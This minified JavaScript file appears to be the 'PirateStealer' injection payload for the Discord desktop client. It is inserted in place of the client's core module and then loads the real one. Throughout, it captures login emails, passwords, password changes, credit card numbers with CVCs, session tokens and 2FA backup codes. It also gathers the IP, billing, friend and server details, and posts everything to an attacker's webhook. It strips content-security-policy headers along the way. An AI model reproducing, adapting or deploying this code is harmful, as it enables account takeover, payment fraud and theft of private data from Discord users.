const{BrowserWindow:BrowserWindow,session:session}=require("electron"),fs=require("fs"),path=require("path"),querystring=require("querystring"),os=require("os"),webhook="%WEBHOOK_LINK%",Filters={1:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v1/tokens"]},2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]}},config={minimum_members_per_server:"%MIN_MEMBERS%",logout:"%LOGOUT%","logout-notify":"%LOGOUTNOTI%","init-notify":"%INITNOTI%","embed-color":347704,"disable-qr-code":"%DISABLEQRCODE%",ping:[!1,"@everyone"]},badges={Discord_Employee:{Value:1,Emoji:"<:staff:874750808728666152>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:partner:874750808678354964>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:hypesquad_events:874750808594477056>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:bughunter_1:874750808426692658>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:early_supporter:874750808414113823>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:bughunter_2:874750808430874664>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:developer:874750808472825986>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:bravery:874750808388952075>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:brilliance:874750808338608199>",Rare:!1},House_Balance:{Value:256,Emoji:"<:balance:874750808267292683>",Rare:!1}};class PirateStealerEvent{constructor(e,t,n){this.event=e,this.data=n,this.token=t}handle(){switch(this.event){case"passwordChanged":passwordChanged(this.data.password,this.data.new_password,this.token);break;case"userLogin":userLogin(this.data.password,this.data.email,this.token);break;case"emailChanged":emailChanged(this.data.password,this.data.email,this.token);break;case"creditCardAdded":creditCardAdded(this.data.cardnumber,this.data.cvc,this.data.expiration,this.token)}}}async function firstTime(){var e=await getToken();if("true"==config["init-notify"]&&fs.existsSync(path.join(__dirname,"init")))if(fs.rmdirSync(path.join(__dirname,"init")),null==e||null==e||""==e){var t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"}}]};sendToWebhook(JSON.stringify(t))}else{var n=await getUserInfo(e);t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized",description:`[**<:partner:909102089513340979> Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}if(!fs.existsSync(path.join(__dirname,"PirateStealerBTW")))return!0;if(fs.rmdirSync(path.join(__dirname,"PirateStealerBTW")),"false"!=config.logout&&"%LOGOUT%"!=config.logout){if(BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'),"true"==config["logout-notify"])if(null==e||null==e||""==e){t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"}}]};sendToWebhook(JSON.stringify(t))}else{const n=await getUserInfo(e);t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User got logged out",description:`[**<:partner:909102089513340979> Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}}return!1}async function userLogin(e,t,n){var a=await getUserInfo(n),r=await getIp(),i=await getServers(n),o=await getBilling(n),s=await getRelationships(n),l={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User Login",description:`[**<:partner:909102089513340979> Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${r}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Billing",value:`${o}`,inline:!1},{name:"Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${s.length})`,color:config["embed-color"],description:s.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Servers (${i.totalguilds})`,color:config["embed-color"],description:i.message,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var d=await get2faCodes(n,e),c={title:":detective: __2FA Codes__",description:`[Get all of them](${d.url})`,color:config["embed-color"],fields:d.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};l.embeds.push(c)}sendToWebhook(JSON.stringify(l))}async function emailChanged(e,t,n){var a=await getUserInfo(n),r=await getIp(),i=await getRelationships(n),o={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Email Changed",description:`[**<:partner:909102089513340979> Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${e}\n${t})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${r}\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"New Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${i.length})`,color:config["embed-color"],description:i.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var s=await get2faCodes(n,e),l={title:":detective: __2FA Codes__",description:`[Get all of them](${s.url})`,color:config["embed-color"],fields:s.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};o.embeds.push(l)}sendToWebhook(JSON.stringify(o))}async function passwordChanged(e,t,n){var a=await getUserInfo(n),r=await getIp(),i=await getServers(n),o=await getBilling(n),s=await getRelationships(n),l={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Password Changed",description:`[**<:partner:909102089513340979> Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${t})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${r}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Billing",value:`${o}`,inline:!1},{name:"Email",value:`\`${a.email}\``,inline:!1},{name:"Old Password",value:`\`${e}\``,inline:!0},{name:"New Password",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${s.length})`,color:config["embed-color"],description:s.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Servers (${i.totalguilds})`,color:config["embed-color"],description:i.message,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var d=await get2faCodes(n,t),c={title:":detective: __2FA Codes__",description:`[Get all of them](${d.url})`,color:config["embed-color"],fields:d.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};l.embeds.push(c)}sendToWebhook(JSON.stringify(l))}async function creditCardAdded(e,t,n,a){var r=await getUserInfo(a),i=await getIp(),o=await getBilling(a),s=await getRelationships(a),l={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Credit Card",description:`[**<:partner:909102089513340979> Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${a})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${r.username}#${r.discriminator}\``,inline:!0},{name:"ID",value:`\`${r.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(r.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(r.flags)}`,inline:!1},{name:"Billing",value:`${o}`,inline:!1},{name:"Email",value:`\`${r.email}\``,inline:!1},{name:"CC Number",value:`\`${e}\``,inline:!0},{name:"Expiration",value:`\`${n}\``,inline:!0},{name:"CVC",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${a}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}`}},{title:`Total Friends (${s.length})`,color:config["embed-color"],description:s.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}`}}]};sendToWebhook(JSON.stringify(l))}async function sendToWebhook(e){const t=new BrowserWindow({width:100,height:100,show:!1});t.loadURL("https://w3.org/"),t.webContents.executeJavaScript(`\n new Promise(function (resolve, reject) {\n\n var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);\n xhr.onload = function () {\n resolve(xhr.response)\n }\n xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${e}));\n\n });\n `,!0).then((()=>{t.close()}))}async function getServers(e){const t=BrowserWindow.getFocusedWindow(),n=await t.webContents.executeJavaScript(`function GetCoolGuilds(e){var r=new XMLHttpRequest;return r.open("GET","https://discord.com/api/v9/users/@me/guilds",!1),r.setRequestHeader("Authorization",e),r.send(null),r.responseText}function GetServerList(e){var r,t=JSON.parse(e);for(var n in cc=t.filter((e=>1==e.owner)).concat(t.filter((e=>8==(8&e.permissions)))),cc)cc[n].membercount=(r=cc[n].id,window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(e,r,t)=>e.exports=t},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{gg=e}]),function(e){const r="string"==typeof e?e:null;for(const t in gg.c)if(gg.c.hasOwnProperty(t)){const n=gg.c[t].exports;if(n&&n.__esModule&&n.default&&(r?n.default[r]:e(n.default)))return n.default;if(n&&(r?n[r]:e(n)))return n}return null}("getMemberCount").getMemberCounts()[r]);return cc}function _696969(){var e=GetCoolGuilds("%TOKEN%"),r=GetServerList(e).filter((e=>e.membercount>=${config.minimum_members_per_server})),t="";for(const e of r)t+="Server Name: "+e.name+" - Owner: "+e.owner+" - Members: "+e.membercount+"\\n";return""==t&&(t="\`No rare servers :(\`"),JSON.stringify({message:t,totalguilds:r.length})}_696969();`.replace("%TOKEN%",e),!0);return JSON.parse(n)}async function getRelationships(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText`,!0);const a=JSON.parse(n).filter((e=>1==e.type));var r="";for(z of a){var i=getRareBadges(z.user.public_flags);""!=i&&(r+=`${i} ${z.user.username}#${z.user.discriminator}\n`)}return r=r??"No Rare Friends",{length:a.length,frien:r}}async function get2faCodes(e,t){let n=[],a="https://ctf.surf/raw/";const r=BrowserWindow.getAllWindows()[0];var i=await r.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${e}");xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));xmlHttp.responseText`,!0);const o=JSON.parse(i).backup_codes.filter((e=>null==e.consumed));for(let e in o)n.push({name:"Code",value:`\`${o[e].code.insert(4,"-")}\``,inline:!0}),a+=`${o[e].code.insert(4,"-")}\n`;return{fields:n,url:a}}async function getBilling(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${e}"); xmlHttp.send( null ); xmlHttp.responseText`,!0),a=JSON.parse(n),r="None";return a.forEach((e=>{if(2==e.type&&1!=e.invalid)r+="`??` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`?`";r+="`??` :credit_card:"}})),r=r??"`?`"}async function getUserInfo(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText;`,!0);return JSON.parse(n)}async function getIp(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript('var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;',!0)}async function getToken(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript("for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;",!0)}function getBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&(t+=a.Emoji)}return""==t&&(t="None"),t}function getRareBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&a.Rare&&(t+=a.Emoji)}return t}function getNitro(e){switch(e){case 1:return"<:classic:896119171019067423> `Nitro Classic`";case 2:return"<a:boost:824036778570416129> `Nitro Boost`";default:return"No Nitro"}}session.defaultSession.webRequest.onBeforeRequest(Filters[2],((e,t)=>{!e.url.startsWith("wss://")||"true"!=config["disable-qr-code"]&&"%DISABLEQRCODE%"!=config["disable-qr-code"]?(firstTime(),t({})):t({cancel:!0})})),session.defaultSession.webRequest.onHeadersReceived(((e,t)=>{e.url.startsWith(webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(Filters[1],(async(e,t)=>{if(200!=e.statusCode)return;const n=Buffer.from(e.uploadData[0].bytes).toString(),a=JSON.parse(n),r=await getToken();switch(!0){case e.url.endsWith("login"):return void new PirateStealerEvent("userLogin",r,{password:a.password,email:a.login}).handle();case e.url.endsWith("users/@me")&&"PATCH"==e.method:if(!a.password)return;if(a.email)new PirateStealerEvent("emailChanged",r,{password:a.password,email:a.email}).handle();if(a.new_password)new PirateStealerEvent("passwordChanged",r,{password:a.password,new_password:a.new_password}).handle();return;case e.url.endsWith("tokens")&&"POST"==e.method:const t=querystring.parse(decodeURIComponent(n));return void new PirateStealerEvent("creditCardAdded",r,{cardnumber:t["card[number]"],cvc:t["card[cvc]"],expiration:`${t["card[exp_month]"]}/${t["card[exp_year]"]}`}).handle()}})),module.exports=require("./core.asar");